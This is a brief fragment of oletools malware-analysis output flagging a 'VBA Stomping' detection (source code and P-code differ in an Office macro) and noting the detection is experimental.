|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

